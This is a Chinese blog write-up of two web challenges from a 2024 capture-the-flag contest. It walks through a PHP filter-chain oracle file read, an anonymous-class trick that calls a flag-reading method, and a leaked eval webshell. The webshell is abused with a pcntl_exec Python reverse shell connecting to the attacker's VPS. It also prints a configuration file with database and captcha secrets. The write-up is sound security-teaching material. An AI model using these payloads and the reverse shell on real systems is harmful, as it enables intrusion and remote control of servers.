---
title: 2024年数字中国创新第四届红明谷杯网络安全大赛WP - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18314087
source: 博客园 - 渗透测试中心
date: 2024-07-21
fetch_date: 2025-10-06T17:41:18.954189
---

# 2024年数字中国创新第四届红明谷杯网络安全大赛WP - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [2024年数字中国创新第四届红明谷杯网络安全大赛WP](https://www.cnblogs.com/backlion/p/18314087 "发布于 2024-07-21 03:40")

## WEB

### **ezphp**

题目描述：`一支专注于卫星通信技术的研究团队正在努力改进他们的通信系统，以提高数据传输的效率和安全性，团队决定采用PHP 8.3.2来完善通信系统开发。`

```
 考点：php filter chain Oracle
```

PHP Filter链——基于oracle的文件读取攻击

参考：<https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkWepSazHG%3D4D>*#toc-16*

题目给出源码如下

```
 <?php
 highlight_file(__FILE__);
 // flag.php
 if (isset($_POST['f'])) {
     echo hash_file('md5', $_POST['f']);
 }
 ?>
```

![image-20240721022130265](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033931462-1413337098.png)

这里可以用的项目：<https://github.com/synacktiv/php_filter_chains_oracle_exploit/>

考点：可用`PHP Filter`链-基于oracle的文件读取攻击生成exp执行，题目提示php版本号正好满足条件，下载exp进行利用

![image-20240721022317838](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033932356-859123644.png)

执行`payload`，这里可能需要多跑几次才可以

```
 python3 filters_chain_oracle_exploit.py  --target http://eci-2zea1zzp9231ugqw9htd.cloudeci1.ichunqiu.com/ --file flag.php --parameter f
```

访问`/flag.php?ezphpPhp8`，读取生成的源码

![image-20240721022347849](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033933294-1512458311.png)

![image-20240721022524879](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033934100-1329942310.png)

```
 <?php
 if (isset($_GET['ezphpPhp8'])) {
     highlight_file(__FILE__);
 } else {
     die("No");
 }
 $a = new class {
     function __construct()
 {
     }

     function getflag()
 {
         system('cat /flag');
     }
 };
 unset($a);
 $a = $_GET['ezphpPhp8'];
 $f = new $a();
 $f->getflag();
 ?>
```

题目提示PHP版本为php 8.3.2，去PHP官网看ChangeLog，直接锁定GH-13097

![image-20240721030306000](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033934837-954013509.png)

本地调试，发现这里是可以用匿名类去读取出来flag，构造payload

本地起个容器：

```
 docker run -itd -p 1238:80 php:8.3.2-apache
 docker exec -it <容器id> /bin/bash
```

放flag.php，测试代码如下：

```
 <?php
 if (isset($_GET['ezphpPhp8'])) {
 //    highlight_file(__FILE__);
 } else {
 //    die("No");
 }
 $anonymous = new class {
     function __construct()
     {
     }

     function getflag()
     {
         system('cat /flag');
     }
 };
 $a = get_class($anonymous);
 echo urlencode($a);
 echo "\n";
 unset($anonymous);
 //echo get_class($a).': now you see me...';
 $a = urldecode("class%40anonymous%00%2Fvar%2Fwww%2Fhtml%2Fflag.php%3A7%240");
 $f = new $a();
 $f->getflag();
 var_dump($f);
 //throw new Exception(
 //    get_class($anonymous).' ...now you don\'t!',
 //    E_USER_ERROR
 //);
```

可以看到能执行getflag方法：

![image-20240721030403850](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033935538-871688973.png)

![image-20240721022458707](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033936253-1251045229.png)

构造`exp`：

```
 /flag.php?ezphpPhp8=anonymous
 /flag.php?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$1
 /flag.php?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0
```

![image-20240721022543080](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033937135-1055631119.png)

### **unauth**

开局一个登录口

![image-20240721022613215](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033937884-999732464.png)

泄露了网站路径/www.zip中有admin的密码：

![image-20240721022644892](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033938562-712807517.png)

www.zip泄露源码如下：

```
 <?php
 if (!isset($_SERVER['PHP_AUTH_USER'])) {
     header('WWW-Authenticate: Basic realm="Restricted Area"');
     header('HTTP/1.0 401 Unauthorized');
     echo '小明是运维工程师，最近网站老是出现bug。';
     exit;
 } else {
     $validUser = 'admin';
     $validPass = '2e525e29e465f45d8d7c56319fe73036';

     if ($_SERVER['PHP_AUTH_USER'] != $validUser || $_SERVER['PHP_AUTH_PW'] != $validPass) {
         header('WWW-Authenticate: Basic realm="Restricted Area"');
         header('HTTP/1.0 401 Unauthorized');
         echo 'Invalid credentials';
         exit;
     }
 }
 @eval($_GET['cmd']);
 highlight_file(__FILE__);
 ?>
```

简单审计一下，可以执行命令但大部分被ban了。

登录后，存在一句话木马，密码为cmd，ban了很多函数，经过测试发现可以用pcntl\_exec反弹shell：

```
//POST传参，反弹shell
 1=pcntl_exec("/usr/bin/python",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("VPS地址",port端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));
最终需要提权，尝试suid未果，发现存在配置文件config.inc.php，其密码是admin用户密码
```

![image-20240721022721413](https://img2023.cnblogs.com/blog/1049983/202407/1049983-20240721033939448-1597752917.png)

```

```

```
<!--?php

 # If you are having problems connecting to the MySQL database and all of the variables below are correct
 # try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
 #   Thanks to @digininja for the fix.

 # Database management system to use
 $DBMS = 'MySQL';
 #$DBMS = 'PGSQL'; // Currently disabled

 # Database variables
 #   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
 #   Please use a database dedicated to DVWA.
 #
 # If you are using MariaDB then you cannot use root, you must use create a dedicated DVWA user.
 #   See README.md for more information on this.
 $_DVWA = array();
 $_DVWA[ 'db_server' ]   = '127.0.0.1';
 $_DVWA[ 'db_database' ] = 'dvwa';
 $_DVWA[ 'db_user' ]     = 'root';
 $_DVWA[ 'db_password' ] = 'b90e0086d8b1165403de6974c4167165';

 # Only used with PostgreSQL/PGSQL database selection.
 $_DVWA[ 'db_port '] = '5432';

 # ReCAPTCHA settings
 #   Used for the 'Insecure CAPTCHA' module
 #   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin
 $_DVWA[ 'recaptcha_public_key' ]  = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';
 $_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';

 # Default security level
 #   Default value for the secuirty level with each session.
 #   The default is 'impossible'. You may wish to set this to either 'low', 'medium', 'high' or impossible'.
 $_DVWA[ 'default_security_level' ] = 'impossible';

 # ...